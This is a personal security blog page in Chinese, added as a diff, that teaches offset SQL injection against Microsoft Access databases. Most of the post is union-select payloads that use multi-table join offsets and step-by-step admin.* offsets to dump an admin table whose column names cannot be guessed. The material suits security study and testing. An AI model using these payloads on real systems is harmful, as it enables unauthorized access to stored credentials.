@@ -1,0 +1,397 @@
+<head>
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+<script src="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget/autoload.js"></script>
+</head>
+
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+<head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="ggy的个人博客">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.2.3">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="https://ggyggy666.github.io">
+    <!--SEO-->
+
+<meta name="keywords" content="Access-偏移注入" />
+
+
+<meta name="description" content="Access数据库需要猜表，猜列名，如果表名猜出来了，但列名却怎么也猜不出来，那么就需要使用偏移注入了。
+
+偏移注入我把它归结为两类，一个是多表偏移，利用同一张表进行内连接从而达到几张相同的表进..." />
+
+
+<meta name="robots" content="all" />
+<meta name="google" content="all" />
+<meta name="googlebot" content="all" />
+<meta name="verify" content="all" />
+    <!--Title-->
+
+<title>
+    
+    Access-偏移注入 |
+    
+    ggy的个人博客
+</title>
+
+<link rel="alternate" href="/atom.xml" title="ggy的个人博客" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+<div class="hide">
+    <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+    document.write(unescape("%3Cspan class='cnzz_stat_icon_1263868967 hide' %3E%3Cscript%20src%3D%22https%3A%2F%2Fs95.cnzz.com%2Fz_stat.php%3Fweb_id%3D1272564536%22%3E%3C%2Fscript%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s19.cnzz.com/z_stat.php%3Fid%3D1263868967%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+</div>
+
+
+
+
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header"  style="background-image:url(
+    https://pic.downk.cc/item/5e3816b82fb38b8c3c8791f9.jpg)"
+     >
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title='ggy'>
+            <img src="/img/avatar.jpg" alt="logo头像" class="img-responsive center-block">
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">Snippet主题,从未如此简单有趣</h2>-->
+            
+            <h2>
+                欢迎来到ggy的个人网站
+            </h2>
+            
+        </div>
+    </div>
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="https://ggyggy666.github.io">
+                        ggy的个人博客</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                首页</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/web安全/"><i class="fa "></i>
+                                web安全</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/python工具/"><i class="fa "></i>
+                                python工具</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/密码学/"><i class="fa "></i>
+                                密码学</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                时间轴</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="Access-偏移注入">
+            
+            Access-偏移注入
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-link" href="/tags/Access-%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5/" rel="tag">Access-偏移注入</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2020/04/16</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                330</strong>
+            天之前发表，文中内容可能已经过时。
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p>Access数据库需要猜表，猜列名，如果表名猜出来了，但列名却怎么也猜不出来，那么就需要使用偏移注入了。</p>
+<a id="more"></a>
+<p>偏移注入我把它归结为两类，一个是多表偏移，利用同一张表进行内连接从而达到几张相同的表进行连接的效果；另一个就是逐位偏移了，知道表的字段数后，利用table.*代替该表的字段数逐步偏移。</p>
+<h1 id="爆总字段数和某表的字段数"><a href="#爆总字段数和某表的字段数" class="headerlink" title="爆总字段数和某表的字段数"></a>爆总字段数和某表的字段数</h1><p>首先先用order by爆出字段数，然后使用union select查看哪个字段回显。注意，这里回显的都是显性回显，还可能存在隐形回显（即不显示出来）。假设有26个字段,已知表名是admin，那么union语句如下：</p>
+<pre><code>?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 from admin</code></pre><p>回显了哪几位我们并不关心。接着使用通配符*代替字段位，即：</p>
+<pre><code>?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,* from admin
+?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,* from admin
+...
+?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,* from admin</code></pre><p>就像这样，一直等到20的时候回显正确了，那么说明这个admin表有26-20=6个字段，用*就代替了admin表的六个字段。接下来就用两种方法分别注入。</p>
+<h1 id="多表偏移"><a href="#多表偏移" class="headerlink" title="多表偏移"></a>多表偏移</h1><p>所谓的多表偏移，就是同一张admin表内连接，但是启用了不同的别名，通过这样打乱原来的字段顺序，从而有可能爆出数据。已经知道了admin表字段数为6，那么可以首先使用两表进行偏移，即：</p>
+<pre><code>?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,* from (admin as a inner join admin as b on a.id=b.id)</code></pre><p>可以看到，对同一张admin表，用了两个别名a,b，然后inner join进行内连接，此时*代替的就是两张admin的字段了，即它表示的字段数为12，而原有的字段数是26，因此最终出现的就是到14为止。如果此时还没有数据爆出，可以尝试：</p>
+<pre><code>?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,a.id,* from (admin as a inner join admin as b on a.id=b.id)</code></pre><p>此时*表示的是11个字段了，如果还不行，那么可以继续：</p>
+<pre><code>?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,a.id,b.id,* from (admin as a inner join admin as b on a.id=b.id)</code></pre><p>此时*表示的是10个字段了。如果还不行，就继续偏移：再连接一张admin表，然后向左偏移admin的字段数，即14-6=8，最终：</p>
+<pre><code>?id=-1 union select 1,2,3,4,5,6,7,8,* from ((admin as a inner join admin as b on a.id=b.id) inner join admin as c on a.id=c.id)</code></pre><p>再连接一张admin表，此时*表示的就是18个字段了，然后同上面的办法将a.id等一个个放进去。即：</p>
+<pre><code>?id=-1 union select 1,2,3,4,5,6,7,8,a.id,* from ((admin as a inner join admin as b on a.id=b.id) inner join admin as c on a.id=c.id)
+?id=-1 union select 1,2,3,4,5,6,7,8,a.id,b.id,* from ((admin as a inner join admin as b on a.id=b.id) inner join admin as c on a.id=c.id)
+?id=-1 union select 1,2,3,4,5,6,7,8,a.id,b.id,c.id* from ((admin as a inner join admin as b on a.id=b.id) inner join admin as c on a.id=c.id)</code></pre><p>可依次尝试。</p>
+<h1 id="逐位偏移"><a href="#逐位偏移" class="headerlink" title="逐位偏移"></a>逐位偏移</h1><p>与多表偏移不同，逐位偏移只有1张表，并且是每一位都尝试去注入。同样，已经知道了admin表的字段数是6，即：</p>
+<pre><code>?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,* from admin</code></pre><p>这里我们需要使用<code>表名.*</code>(即<code>admin.*</code>)代替*，以表示6位，同时应该使用上原来的21-26位。看下面例子就明白了：</p>
+<pre><code>?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,admin.* from admin</code></pre><p>由于admin.*是6位，必须与20相加等于原来的26位。进行逐位偏移，向左移一位：</p>
+<pre><code>?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,admin.*,26 from admin</code></pre><p>26用上了。继续向左偏移：</p>
+<pre><code>?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,admin.*,25,26 from admin
+?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,admin.*,24,25,26 from admin
+...
+?id=-1 union select admin.*,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 from admin</code></pre><p>一直挪到第一位为止。</p>
+<h1 id="直接看源代码"><a href="#直接看源代码" class="headerlink" title="直接看源代码"></a>直接看源代码</h1><p>我们要爆出的字段名很可能就是代码中输入框的名字。因此可以尝试看input标签中的name属性的值，然后当做列名看是否能成功猜测出来。</p>
+
+    </div>
+    
+    <div class="reward" ontouchstart>
+    <div class="reward-wrap">赏
+        <div class="reward-box">
+            
+            <span class="reward-type">
+                <img class="alipay" src="/img/alipay.jpg"><b>支付宝打赏</b>
+            </span>
+            
+            
+            <span class="reward-type">
+                <img class="wechat" src="/img/wechat.jpg"><b>微信打赏</b>
+            </span>
+            
+        </div>
+    </div>
+    <p class="reward-tip">
+        赞赏是不耍流氓的鼓励
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="ggy.44pp.vip" target="_blank">ggy</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/2020/04/25/%E7%BB%BC%E5%90%88%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1-%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2/" class="pre-post btn btn-default" title='综合课程设计--登录页面'>
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            综合课程设计--登录页面</span>
+    </a>
+    
+    
+    <a href="/2020/04/13/HTTP-Leak%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/" class="next-post btn btn-default" title='HTTP Leak漏洞原理及利用'>
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            HTTP Leak漏洞原理及利用</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<div id="lv-container" data-id="city" data-uid="MTAyMC80ODM1Ni8yNDg1MA==">
+    <script type="text/javascript">
+    (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+    })(document, 'script');
+    </script>
+</div>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            文章目录
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#爆总字段数和某表的字段数"><span class="toc-text">爆总字段数和某表的字段数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#多表偏移"><span class="toc-text">多表偏移</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#逐位偏移"><span class="toc-text">逐位偏移</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#直接看源代码"><span class="toc-text">直接看源代码</span></a></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    访问量:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    &nbsp; | &nbsp;
+    访客数:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright &copy;
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//hexo.io" class="copyright-links" target="_blank" rel="nofollow">Hexo</a>
+                </span> |
+                <span>
+                    Theme by <a href="//github.com/shenliyang/hexo-theme-snippet.git" class="copyright-links" target="_blank" rel="nofollow">Snippet</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="/assets/tagcanvas.min.js?rev=2.9.js"></script>
+
+<script>
+var tagOption = {
+    textColour: '#444', // 字体颜色
+    outlineMethod: 'block', // 选中模式
+    outlineColour: '#FFDAB9', // 选中模式的颜色
+    interval: 30 || 30, // 动画帧之间的时间间隔，值越大，转动幅度越大
+    textHeight: 13,
+    outlineRadius: 3,
+    freezeActive: true || '', // 选中的标签是否继续滚动
+    frontSelect: true || '', // 不选标签云后部的标签
+    initial: [0.1, -0.1],
+    depth: 0.5,
+    decel: 0.95,
+    maxSpeed: 0.03,
+    reverse: true || '', // 是否反向触发
+    fadeIn: 500, // 进入动画时间
+    wheelZoom: false || '' // 是否启用鼠标滚轮
+}
+TagCanvas.Start('tag-cloud-3d', '', tagOption);
+</script>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+<!-- 雪花特效 -->
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<script type="text/javascript" src="\js\snow.js"></script>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"live2d-widget-model-haruto"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
